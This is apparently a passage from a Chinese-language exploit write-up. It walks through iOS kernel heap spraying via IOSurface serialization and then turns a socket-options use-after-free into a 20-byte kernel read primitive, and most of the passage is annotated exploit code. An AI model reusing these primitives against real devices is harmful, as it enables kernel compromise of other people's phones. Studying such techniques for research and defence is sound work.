<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count, <span class="keyword">void</span> *data, uint32_t data_size, <span class="keyword">void</span> (^callback)(uint32_t array_id, uint32_t data_id, <span class="keyword">void</span> *data, size_t size)) &#123;</span><br><span class="line">    <span class="comment">// 1. 创建一个 IOSurfaceRootClient 对象与内核通信</span></span><br><span class="line">    <span class="comment">// Make sure our IOSurface is initialized.</span></span><br><span class="line">    <span class="keyword">bool</span> ok = IOSurface_init();</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 我们当前的使用方式下 extra_count = 0，因此可以忽略 extra_count</span></span><br><span class="line">    <span class="comment">// How big will our OSUnserializeBinary dictionary be?</span></span><br><span class="line">    uint32_t current_array_length = array_length + (extra_count &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 计算 Spraying Data 所需要的 XML 结点数</span></span><br><span class="line">    size_t xml_units_per_data = xml_units_for_data_size(data_size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 这里的多个 1 代表除去 Spraying Data 外的固定 XML 结点，后面具体构造会看到</span></span><br><span class="line">    size_t xml_units = <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span> + (<span class="number">1</span> + xml_units_per_data) * current_array_length + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5. 构造传入内核的 args，包含了待构造 xml 与其他描述内容</span></span><br><span class="line">    <span class="comment">// Allocate the args struct.</span></span><br><span class="line">    <span class="keyword">struct</span> IOSurfaceValueArgs *args;</span><br><span class="line">    size_t args_size = <span class="keyword">sizeof</span>(*args) + xml_units * <span class="keyword">sizeof</span>(args-&gt;xml[<span class="number">0</span>]);</span><br><span class="line">    args = malloc(args_size);</span><br><span class="line">    assert(args != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Build the IOSurfaceValueArgs.</span></span><br><span class="line">    args-&gt;surface_id = IOSurface_id;</span><br><span class="line">    <span class="comment">// Create the serialized OSArray. We'll remember the locations we need to fill in with our</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 6. 每个 XML 都包含了一个 OSArray 来容纳 Spraying Data</span></span><br><span class="line">    <span class="comment">// 这里的 xml_data 数组即容纳 current_array_length(256) 个 xml_data</span></span><br><span class="line">    <span class="comment">// 每个 xml_data 包含一个 Spraying Data，它由多个 xml 结点组成</span></span><br><span class="line">    <span class="comment">// data as well as the slot we need to set our key.</span></span><br><span class="line">    uint32_t **xml_data = malloc(current_array_length * <span class="keyword">sizeof</span>(*xml_data));</span><br><span class="line">    assert(xml_data != <span class="literal">NULL</span>);</span><br><span class="line">    uint32_t *key;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 7. 构造 XML</span></span><br><span class="line">    size_t xml_size = serialize_IOSurface_data_array(args-&gt;xml,</span><br><span class="line">    		current_array_length, data_size, xml_data, &amp;key);</span><br><span class="line">    assert(xml_size == xml_units * <span class="keyword">sizeof</span>(args-&gt;xml[<span class="number">0</span>]));</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>上述构造过程较为复杂，总共有 7 个关键步骤，在上面的代码中已通过注释的方式说明，读者可先粗略了解一下整个过程，接下来我们详细分析这些过程。</p>
<h3 id="XML-Spraying-原理"><a href="#XML-Spraying-原理" class="headerlink" title="XML Spraying 原理"></a>XML Spraying 原理</h3><p>在上述步骤 7 中我们构造了一个装有 256 个 OSString 的 OSArray，其中 OSString 为序列化的 Spraying Data，通过 IOSurfaceRootClient 将 XML 送入内核缓冲区后，内核会为这些 OSString 分配空间，而 OSString 就是我们需要喷射的数据，因此通过这种方式成功的实现了任意数据的 Heap Spraying。</p>
<h3 id="关键数据计算"><a href="#关键数据计算" class="headerlink" title="关键数据计算"></a>关键数据计算</h3><p>用于 IOSurface 传输的 XML 对象的每个结点都可以用一个 uint32 表示，称为 XML Unit，由于 IOSurface 调用必须指定输入的长度，因此计算好每一轮 Spraying 使用的 XML 大小至关重要。</p>
<p>在步骤 3 中，我们计算了 Spraying Data 对应的 XML Units 数量：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 计算 Spraying Data 所需要的 XML 结点数</span></span><br><span class="line"><span class="keyword">size_t</span> xml_units_per_data = xml_units_for_data_size(data_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * xml_units_for_data_size</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> * 	Return the number of XML units needed to store the given size of data in an OSString.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">xml_units_for_data_size(<span class="keyword">size_t</span> data_size) &#123;</span><br><span class="line">    <span class="keyword">return</span> ((data_size - <span class="number">1</span>) + <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>) - <span class="number">1</span>) / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于序列化数据在内核中被表示为 OSString，所以我们需要考虑结尾的 <code>\0</code>，此时只能牺牲数据的最后一位作为 <code>\0</code>，因此实际计算的大小为 <code>size - 1</code>，接下来的公式就转化为 <code>(actual_size + n - 1) / n</code>，这是典型的 Ceiling 函数，即对 actual_size 除以 4(XML Unit Size) 向上取整，最后得到的是每个 Spraying Data 对应的 OSString 所占据的 XML Units Count，并存储在 <code>xml_units_per_data</code> 中。</p>
<p>随后在步骤 4 中，我们基于 <code>xml_units_per_data</code> 计算了 XML Units Count 的总数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> xml_units = <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span> + (<span class="number">1</span> + xml_units_per_data) * current_array_length + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>其中 <code>(1 + xml_units_per_data) * current_array_length</code> 不难理解，即将 OSString Header + Data 结构重复 <code>current_array_length</code> 次后的 Units Count，前后的 3 个 1 均表示额外的描述性 XML Units。</p>
<p>最后在步骤 6 中，我们准备了一个 XML Units 指针数组，用于指向 XML 中待填充 OSString 的 <code>current_array_length</code> 个区域的 Child Unit Header：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> **xml_data = <span class="built_in">malloc</span>(current_array_length * <span class="keyword">sizeof</span>(*xml_data));</span><br></pre></td></tr></table></figure>

<p>该数组会在 XML 构建过程中使用，将 <code>current_array_length</code> 个 OSString 的 Header Unit Address 保存下来，以便接下来将 Spraying Data 拷贝到 XML 中。</p>
<h3 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a>构造过程</h3><p>构造的关键在步骤 7 对 <code>serialize_IOSurface_data_array</code> 的调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOSurfaceValueArgs</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> surface_id;</span><br><span class="line">    <span class="keyword">uint32_t</span> _out1;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> xml[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOSurfaceValueArgs</span> *<span class="title">args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> args_size = <span class="keyword">sizeof</span>(*args) + xml_units * <span class="keyword">sizeof</span>(args-&gt;xml[<span class="number">0</span>]);</span><br><span class="line">args = <span class="built_in">malloc</span>(args_size);</span><br><span class="line"><span class="comment">// 7. 构造 XML</span></span><br><span class="line"><span class="keyword">uint32_t</span> *key;</span><br><span class="line"><span class="keyword">uint32_t</span> **xml_data = <span class="built_in">malloc</span>(current_array_length * <span class="keyword">sizeof</span>(*xml_data));</span><br><span class="line"><span class="keyword">size_t</span> xml_size = serialize_IOSurface_data_array(args-&gt;xml, current_array_length, data_size, xml_data, &amp;key);</span><br></pre></td></tr></table></figure>

<p>这里的 <code>args-&gt;xml</code> 即 XML Units 指针，它通过指向一个 XML Header Unit 来引用 XML。</p>
<p>由于前期准备充分，这里的计算并不复杂，只是对 XML 链表的拼接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">serialize_IOSurface_data_array(<span class="keyword">uint32_t</span> *xml0, <span class="keyword">uint32_t</span> array_length, <span class="keyword">uint32_t</span> data_size, <span class="keyword">uint32_t</span> **xml_data, <span class="keyword">uint32_t</span> **key) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> *xml = xml0;</span><br><span class="line">    *xml++ = kOSSerializeBinarySignature;</span><br><span class="line">    *xml++ = kOSSerializeArray | <span class="number">2</span> | kOSSerializeEndCollection;</span><br><span class="line">    *xml++ = kOSSerializeArray | array_length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; array_length; i++) &#123;</span><br><span class="line">    	<span class="keyword">uint32_t</span> flags = (i == array_length - <span class="number">1</span> ? kOSSerializeEndCollection : <span class="number">0</span>);</span><br><span class="line">    	*xml++ = kOSSerializeData | (data_size - <span class="number">1</span>) | flags;</span><br><span class="line">    	xml_data[i] = xml;</span><br><span class="line">    	xml += xml_units_for_data_size(data_size);</span><br><span class="line">    &#125;</span><br><span class="line">    *xml++ = kOSSerializeSymbol | <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>) + <span class="number">1</span> | kOSSerializeEndCollection;</span><br><span class="line">    *key = xml++; <span class="comment">// This will be filled in on each array loop.</span></span><br><span class="line">    *xml++ = <span class="number">0</span>;	<span class="comment">// Null-terminate the symbol.</span></span><br><span class="line">    <span class="keyword">return</span> (xml - xml0) * <span class="keyword">sizeof</span>(*xml);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>xml0</code> 为当前 XML 的 Header Units，我们定义一个 <code>xml</code> 变量作为 Cursor，逐步构建 XML，每个 XML Unit 都由一个 uint32 描述，以头部 3 句为例:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*xml++ = kOSSerializeBinarySignature;</span><br><span class="line">*xml++ = kOSSerializeArray | <span class="number">2</span> | kOSSerializeEndCollection;</span><br><span class="line">*xml++ = kOSSerializeArray | array_length;</span><br></pre></td></tr></table></figure>

<p>它相当于声明了如下 XML 结构：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeBinarySignature</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span>&gt;</span>2<span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span> <span class="attr">length</span>=<span class="string">$&#123;array_length&#125;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>它正好是上文中计算 XML Units Count 的前面 3 个 1。</p>
<p>随后的循环中将 <code>array_length</code> 个 OSString 填充到 OSArray 中，并将这些 OSString 的 XML Unit Address 存入 <code>xml_data</code> 指针数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; array_length; i++) &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> flags = (i == array_length - <span class="number">1</span> ? kOSSerializeEndCollection : <span class="number">0</span>);</span><br><span class="line">	*xml++ = kOSSerializeData | (data_size - <span class="number">1</span>) | flags;</span><br><span class="line">	xml_data[i] = xml;</span><br><span class="line">	xml += xml_units_for_data_size(data_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这构建了如下的 XML：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeBinarySignature</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span>&gt;</span>2<span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span> <span class="attr">length</span>=<span class="string">$&#123;array_length&#125;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[0] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[array_length - 1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后填充的是尾部的 XML Units：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*xml++ = kOSSerializeSymbol | <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>) + <span class="number">1</span> | kOSSerializeEndCollection;</span><br><span class="line">*key = xml++; <span class="comment">// This will be filled in on each array loop.</span></span><br><span class="line">*xml++ = <span class="number">0</span>; <span class="comment">// Null-terminate the symbol.</span></span><br></pre></td></tr></table></figure>

<p>这里包含了 3 个 Units：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeSymbol</span>&gt;</span>$&#123;sizeof(uint32_t) + 1&#125;<span class="tag">&lt;/<span class="name">kOSSerializeSymbol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>$&#123;key&#125;<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>这也印证了上文 XML Units 计算的尾部的 +3，因此最后得到的 XML 为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeBinarySignature</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span>&gt;</span>2<span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeArray</span> <span class="attr">length</span>=<span class="string">$&#123;array_length&#125;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[0] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">kOSSerializeData</span> <span class="attr">length</span>=<span class="string">$&#123;data_size</span> <span class="attr">-</span> <span class="attr">1</span>&#125;&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xml_data[array_length - 1] --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">kOSSerializeData</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">kOSSerializeArray</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">kOSSerializeSymbol</span>&gt;</span>$&#123;sizeof(uint32_t) + 1&#125;<span class="tag">&lt;/<span class="name">kOSSerializeSymbol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>$&#123;key&#125;<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>此时 XML 结构已经构建完毕，只需要向 <code>xml_data</code> 占位符中填充 Spraying Data，向 key 中填充标识符即可完成组装。</p>
<h2 id="组装数据"><a href="#组装数据" class="headerlink" title="组装数据"></a>组装数据</h2><p>接下来的代码完成的是数据填充和向内核发送数据，基于上面的讨论很好理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Keep track of when we need to do GC.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> total_arrays = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> sprayed = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> next_gc_step = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// Loop through the arrays.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> array_id = <span class="number">0</span>; array_id &lt; array_count; array_id++) &#123;</span><br><span class="line">    <span class="comment">// If we've crossed the GC sleep boundary, sleep for a bit and schedule the</span></span><br><span class="line">    <span class="comment">// next one.</span></span><br><span class="line">    <span class="comment">// Now build the array and its elements.</span></span><br><span class="line">    <span class="comment">// 1. 生成唯一标识符填充到 key</span></span><br><span class="line">    *key = base255_encode(total_arrays + array_id);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> data_id = <span class="number">0</span>; data_id &lt; current_array_length; data_id++) &#123;</span><br><span class="line">        <span class="comment">// Copy in the data to the appropriate slot.</span></span><br><span class="line">        <span class="comment">// 2. 将数据填充到 OSString</span></span><br><span class="line">        <span class="built_in">memcpy</span>(xml_data[data_id], data, data_size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 向内核发送数据</span></span><br><span class="line">    <span class="comment">// Finally set the array in the surface.</span></span><br><span class="line">    ok = IOSurface_set_value(args, args_size);</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">    	<span class="built_in">free</span>(args);</span><br><span class="line">    	<span class="built_in">free</span>(xml_data);</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">        sprayed += data_size * current_array_length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上述代码中标出的 3 个关键步骤即可将组装好的 XML 送入内核帧缓冲区，内核会为其中的 OSString 分配内存，在这个过程中就完成了 Heap Spraying。</p>
<h1 id="使用-IOSurface-Heap-Spraying-实现-kread"><a href="#使用-IOSurface-Heap-Spraying-实现-kread" class="headerlink" title="使用 IOSurface Heap Spraying 实现 kread"></a>使用 IOSurface Heap Spraying 实现 kread</h1><p>通过构造多个悬垂的 <code>in6p_outputopts</code>，再以伪造的 <code>in6p_outputopts</code> 进行 spraying，将伪造数据结构的 pktinfo 指向待读取地址，minmtu 作为标识符，进行 IOSurface Spraying，随后基于 minmtu 挑选成功 Spraying 的悬垂 <code>in6p_outputopts</code> 区域，使用 getsockopt 获取 pktinfo 结构体内容，由于该结构体大小为 20B，我们由此拿到了指定内核地址 20B 的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// second primitive: read 20 bytes from addr</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">read_20_via_uaf</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create a bunch of sockets</span></span><br><span class="line">    <span class="keyword">int</span> sockets[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">128</span>; i++) &#123;</span><br><span class="line">        sockets[i] = get_socket_with_dangling_options();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create a fake struct with our dangling port address as its pktinfo</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip6_pktopts</span> *<span class="title">fake_opts</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ip6_pktopts</span>));</span></span><br><span class="line">    fake_opts-&gt;ip6po_minmtu = <span class="number">0x41424344</span>; <span class="comment">// give a number we can recognize</span></span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)((<span class="keyword">uint64_t</span>)fake_opts + <span class="number">164</span>) = <span class="number">0x41424344</span>; <span class="comment">// on iOS 10, offset is different</span></span><br><span class="line">    fake_opts-&gt;ip6po_pktinfo = (struct in6_pktinfo*)addr;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> found_at = <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// iterate through the sockets to find if we overwrote one</span></span><br><span class="line">        spray_IOSurface((<span class="keyword">void</span> *)fake_opts, <span class="keyword">sizeof</span>(struct ip6_pktopts));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">128</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">int</span> minmtu = <span class="number">-1</span>;</span><br><span class="line">            get_minmtu(sockets[j], &amp;minmtu);</span><br><span class="line">            <span class="keyword">if</span> (minmtu == <span class="number">0x41424344</span>) &#123; <span class="comment">// found it!</span></span><br><span class="line">                found_at = j; <span class="comment">// save its index</span></span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (found) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(fake_opts);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Failed to read kernel\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">128</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != found_at) &#123;</span><br><span class="line">            <span class="built_in">close</span>(sockets[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct in6_pktinfo));</span><br><span class="line">    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);</span><br><span class="line">    <span 